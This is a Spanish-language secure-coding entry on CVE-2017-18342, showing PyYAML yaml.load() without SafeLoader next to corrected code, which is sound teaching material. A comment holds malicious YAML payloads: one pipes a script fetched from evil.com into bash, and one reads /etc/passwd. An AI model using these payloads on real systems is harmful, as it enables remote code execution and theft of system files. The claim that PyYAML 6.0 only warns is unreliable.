# Case: RCE via yaml.load() sin SafeLoader (CVE-2017-18342)

## CVE

CVE-2017-18342

## CWE asociado

CWE-502

## Descripción

PyYAML `yaml.load()` sin especificar `Loader=SafeLoader` permite la construcción de objetos Python arbitrarios vía tags YAML como `!!python/object/apply:`. Esto equivale a `eval()` — cualquier archivo YAML de fuente no confiable puede ejecutar código.

## Código vulnerable

```python
import yaml

# yaml.load sin Loader — ejecuta código arbitrario
with open("user_config.yaml") as f:
    config = yaml.load(f)  # WARNING: unsafe

# El YAML malicioso:
# !!python/object/apply:os.system ['curl http://evil.com/shell.sh | bash']
# !!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]
```

## Código corregido

```python
import yaml

# Opción 1: yaml.safe_load (solo tipos básicos Python)
with open("user_config.yaml") as f:
    config = yaml.safe_load(f)

# Opción 2: especificar SafeLoader explícitamente
config = yaml.load(data, Loader=yaml.SafeLoader)

# Opción 3: para schemas custom, crear un Loader restringido
class AppLoader(yaml.SafeLoader):
    pass  # añadir solo constructors necesarios

config = yaml.load(data, Loader=AppLoader)
```

## Contexto

PyYAML 6.0+ emite un warning cuando `yaml.load()` se llama sin Loader. Pero código legacy y tutoriales antiguos siguen usando la forma insegura. El patrón es especialmente peligroso en: (1) carga de configuración desde APIs, (2) parseo de CI/CD pipelines, (3) importación de datos de usuarios, (4) templates de infraestructura.

## Referencia

- https://nvd.nist.gov/vuln/detail/CVE-2017-18342
- https://pyyaml.org/wiki/PyYAMLDocumentation
- https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation
